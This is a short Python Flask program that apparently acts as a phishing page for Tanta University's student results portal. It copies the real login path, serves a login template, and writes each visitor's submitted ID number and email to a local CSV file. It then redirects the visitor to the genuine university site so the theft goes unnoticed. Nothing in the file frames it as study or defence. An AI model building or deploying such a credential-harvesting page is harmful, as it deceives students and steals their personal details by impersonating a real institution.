from flask import Flask , render_template , request , redirect
import csv


class TantaResult:

	def __init__(self):
		self.result = Flask(__name__)
		self.website()
		self.result.run()


	def website(self):
		@self.result.route("/student_results/card_login.aspx" , methods=["POST","GET"])
		def login():
			if request.method == "POST":

				id_num = request.form.get("id_num")
				email  = request.form.get("email")
				details = [id_num , email]

				with open("details.csv","a") as f:
					csvwriter = csv.writer(f)
					csvwriter.writerow(details)
				
				return redirect("https://tdb.tanta.edu.eg/student_results/card_login.aspx")
				
			return render_template("index.html")

		@self.result.route("/")
		def redir1():
			return redirect("/student_results/card_login.aspx")
		@self.result.route("/student_results/")
		def redir2():
			return redirect("/student_results/card_login.aspx")



if __name__ == "__main__":

	obj = TantaResult()
